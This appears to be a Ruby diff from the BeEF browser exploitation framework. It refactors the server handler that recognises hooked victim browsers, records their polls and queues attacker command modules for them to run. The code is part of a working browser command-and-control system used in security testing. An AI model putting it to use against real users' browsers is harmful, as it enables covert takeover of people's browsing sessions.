@@ -39,53 +39,35 @@ module BeEF
 
       # get zombie if already hooked the framework
       hook_session_id = request.get_hook_session_id()
-      zombie = BeEF::Models::Zombie.first(:session => hook_session_id) if not hook_session_id.nil?
+      hooked_browser = BeEF::Models::Zombie.first(:session => hook_session_id) if not hook_session_id.nil?
       
-      if not zombie # is a new browser so set up the hook
-      
-        # create the session id used to maintain the hooked session
-        hook_session_value = BeEF::Crypto::secure_token
-        
-        # create the structure repesenting the hooked browser
-        zombie = BeEF::Models::Zombie.new(:ip => request.peeraddr[3], :session => hook_session_value)
-        zombie.firstseen = Time.new.to_i
-        zombie.has_init = false # set to true (in inithandler.rb) when the init values returned
-        zombie.httpheaders = request.header.to_json
-        zombie.save # the save needs to be conducted before any hooked browser specific logging
-        
-        # add a log entry for the newly hooked browser
-        log_zombie_domain = zombie.domain
-        log_zombie_domain = "(blank)" if log_zombie_domain.nil? or log_zombie_domain.empty?
-        BeEF::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}", "#{zombie.id}") 
-        
-        # check if the framework is already loaded in the browser - this check is based on the existance of the beef_js_cmp param
-        # for example, when the db is reset and a hooked browser (with the framework loaded) will reconnect
-        @beef_js_cmps = request.query['beef_js_cmps'] || nil
-        framework_loaded = (not @beef_js_cmps.nil?)
+      if not hooked_browser # is a new browser so return instructions to set up the hook
         
         # generate the instructions to hook the browser
-        build_beefjs!(hook_session_value, framework_loaded)
+        build_beefjs!()
+      
+      else # is a known browseer so send instructions 
+      
+        # record the last poll from the browser
+        hooked_browser.lastseen = Time.new.to_i
+      
+        hooked_browser.count!
+        hooked_browser.save
+      
+        execute_plugins!
+      
+        # add all availible command module instructions to the response
+        zombie_commands = BeEF::Models::Command.all(:zombie_id => hooked_browser.id, :has_run => false)
+        zombie_commands.each{|command| add_command_instructions(command, hooked_browser)}
+
+        # add all availible autoloading command module instructions to the response
+        autoloadings = BeEF::Models::Command.all(:autoloadings => { :in_use => true })
+        autoloadings.each {|command| add_command_instructions(command, hooked_browser)}
+
+        # executes the requester
+        requester_run(hooked_browser)
         
       end
-      
-      # record the last poll from the browser
-      zombie.lastseen = Time.new.to_i
-      
-      zombie.count!
-      zombie.save
-      
-      execute_plugins!
-      
-      # add all availible command module instructions to the response
-      zombie_commands = BeEF::Models::Command.all(:zombie_id => zombie.id, :has_run => false)
-      zombie_commands.each{|command| add_command_instructions(command, zombie)}
-
-      # add all availible autoloading command module instructions to the response
-      autoloadings = BeEF::Models::Command.all(:autoloadings => { :in_use => true })
-      autoloadings.each {|command| add_command_instructions(command, zombie)}
-
-      # executes the requester
-      requester_run(zombie)
 
       # set response headers and body
       response.set_no_cache
